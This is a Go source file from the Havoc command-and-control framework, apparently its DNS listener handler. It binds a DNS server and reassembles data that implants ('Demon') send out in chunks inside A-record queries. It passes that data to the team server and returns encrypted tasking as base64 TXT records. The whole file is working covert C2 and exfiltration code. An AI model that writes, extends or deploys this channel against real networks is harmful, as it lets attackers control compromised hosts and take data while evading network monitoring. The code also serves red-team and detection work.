package handlers

import (
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"sync"

	"Havoc/pkg/agent"
	"Havoc/pkg/logger"

	"github.com/miekg/dns"
)

// dnsSession tracks partial uplink chunk reassembly for a pending packet.
type dnsSession struct {
	chunks   map[int][]byte
	total    int
	received int
}

// DNS is the DNS C2 listener handler.
// It binds a miekg/dns server on UDP and TCP, reassembles uplink A-query
// chunks into AuthWireBuffer payloads, feeds them to parseAgentRequest, and
// serves the queued response as base64-encoded TXT chunks on downlink polls.
type DNS struct {
	Config     DNSConfig
	Teamserver agent.TeamServer

	server *dns.Server

	mu        sync.Mutex
	pending   map[string]*dnsSession // key: aid8+seq4 hex
	responses map[string][]byte      // key: aid8 hex → queued encrypted response
}

// sessionKey returns the reassembly map key for a pending packet.
func sessionKey(aid uint32, seq uint16) string {
	return fmt.Sprintf("%08x%04x", aid, seq)
}

// Start binds the DNS server on both UDP and TCP.
func (d *DNS) Start() error {
	d.pending = make(map[string]*dnsSession)
	d.responses = make(map[string][]byte)

	mux := dns.NewServeMux()
	// Register handler for the configured zone (trailing dot = FQDN convention)
	mux.HandleFunc(strings.ToLower(d.Config.ZoneDomain)+".", d.ServeDNS)

	addr := fmt.Sprintf("%s:%d", d.Config.HostBind, d.Config.Port)

	udpSrv := &dns.Server{Addr: addr, Net: "udp", Handler: mux}
	tcpSrv := &dns.Server{Addr: addr, Net: "tcp", Handler: mux}

	go func() {
		if err := udpSrv.ListenAndServe(); err != nil {
			logger.Error(fmt.Sprintf("DNS [%s] UDP: %s", d.Config.Name, err.Error()))
		}
	}()
	go func() {
		if err := tcpSrv.ListenAndServe(); err != nil {
			logger.Error(fmt.Sprintf("DNS [%s] TCP: %s", d.Config.Name, err.Error()))
		}
	}()

	d.server = udpSrv
	logger.Info(fmt.Sprintf("DNS listener '%s' started on %s zone %s",
		d.Config.Name, addr, d.Config.ZoneDomain))
	return nil
}

// ServeDNS implements dns.Handler and is called for every DNS query
// received by both the UDP and TCP servers.
func (d *DNS) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	remoteAddr := w.RemoteAddr().String()
	remoteIP := remoteAddr
	if host, _, err := net.SplitHostPort(remoteAddr); err == nil {
		remoteIP = host
	}

	for _, q := range r.Question {
		name := strings.ToLower(q.Name)

		switch q.Qtype {
		case dns.TypeA:
			rr := d.handleUplink(q, name, remoteIP)
			if rr != nil {
				m.Answer = append(m.Answer, rr)
			} else {
				m.Rcode = dns.RcodeNameError // NXDOMAIN for invalid/unknown queries
			}
		case dns.TypeTXT:
			rr := d.handleDownlink(q, name)
			if rr != nil {
				m.Answer = append(m.Answer, rr)
			}
			// empty answer = "no data ready" — Demon retries on next cycle
		default:
			m.Rcode = dns.RcodeNameError
		}
	}

	_ = w.WriteMsg(m)
}

// handleUplink processes a single uplink A-query chunk.
// When all chunks for a packet are received, the reassembled payload is fed
// to parseAgentRequest and the encrypted response is queued for downlink.
// Returns an A RR ACK (0.0.0.1) on success, nil on invalid queries (→ NXDOMAIN).
func (d *DNS) handleUplink(q dns.Question, name, remoteIP string) dns.RR {
	chunk, seq, cid, tot, aid, err := dnsParseUploadFqdn(name, d.Config.ZoneDomain)
	if err != nil {
		logger.Debug(fmt.Sprintf("DNS uplink parse error: %s (name=%s)", err.Error(), name))
		return nil
	}

	if int(tot) == 0 {
		logger.Debug(fmt.Sprintf("DNS uplink: tot=0 is invalid (name=%s)", name))
		return nil
	}

	aidKey := fmt.Sprintf("%08x", aid)
	sKey := sessionKey(aid, seq)

	d.mu.Lock()
	sess, ok := d.pending[sKey]
	if !ok {
		sess = &dnsSession{
			chunks: make(map[int][]byte),
			total:  int(tot),
		}
		d.pending[sKey] = sess
	}
	if _, dup := sess.chunks[int(cid)]; !dup {
		sess.chunks[int(cid)] = chunk
		sess.received++
	}
	complete := sess.received >= sess.total
	var fullPayload []byte
	if complete {
		for i := 0; i < sess.total; i++ {
			fullPayload = append(fullPayload, sess.chunks[i]...)
		}
		delete(d.pending, sKey)
	}
	d.mu.Unlock()

	if complete {
		resp, ok := parseAgentRequest(d.Teamserver, fullPayload, remoteIP)
		if ok && resp.Len() > 0 {
			d.mu.Lock()
			d.responses[aidKey] = resp.Bytes()
			d.mu.Unlock()
		}
	}

	// ACK every chunk (complete or partial) with 0.0.0.1
	return &dns.A{
		Hdr: dns.RR_Header{
			Name:   q.Name,
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET,
			Ttl:    0,
		},
		A: net.IPv4(0, 0, 0, 1),
	}
}

// handleDownlink processes a downlink TXT-poll query.
// It slices the queued response at the requested byte offset and returns it
// as a base64-encoded TXT string. The last chunk is prefixed with 0xFF so
// the Demon knows the response is complete. An empty TXT answer signals
// "no data ready" and the Demon retries.
func (d *DNS) handleDownlink(q dns.Question, name string) dns.RR {
	_, offset, aid, err := dnsParseDownlinkFqdn(name, d.Config.ZoneDomain)
	if err != nil {
		logger.Debug(fmt.Sprintf("DNS downlink parse error: %s (name=%s)", err.Error(), name))
		return nil
	}

	aidKey := fmt.Sprintf("%08x", aid)

	d.mu.Lock()
	resp, ok := d.responses[aidKey]
	d.mu.Unlock()

	if !ok || len(resp) == 0 {
		// No data queued — return empty TXT
		return &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			Txt: []string{},
		}
	}

	start := int(offset)
	if start >= len(resp) {
		// Offset past end — all data already served; send sentinel
		d.mu.Lock()
		delete(d.responses, aidKey)
		d.mu.Unlock()
		sentinel := base64.StdEncoding.EncodeToString([]byte{0xFF})
		return &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			Txt: []string{sentinel},
		}
	}

	end := start + dnsTXTChunkSize
	last := end >= len(resp)
	if last {
		end = len(resp)
	}

	chunk := resp[start:end]
	var encoded string
	if last {
		// Prepend 0xFF sentinel so Demon recognises end-of-response
		withSentinel := make([]byte, 1+len(chunk))
		withSentinel[0] = 0xFF
		copy(withSentinel[1:], chunk)
		encoded = base64.StdEncoding.EncodeToString(withSentinel)

		d.mu.Lock()
		delete(d.responses, aidKey)
		d.mu.Unlock()
	} else {
		encoded = base64.StdEncoding.EncodeToString(chunk)
	}

	return &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   q.Name,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    0,
		},
		Txt: []string{encoded},
	}
}
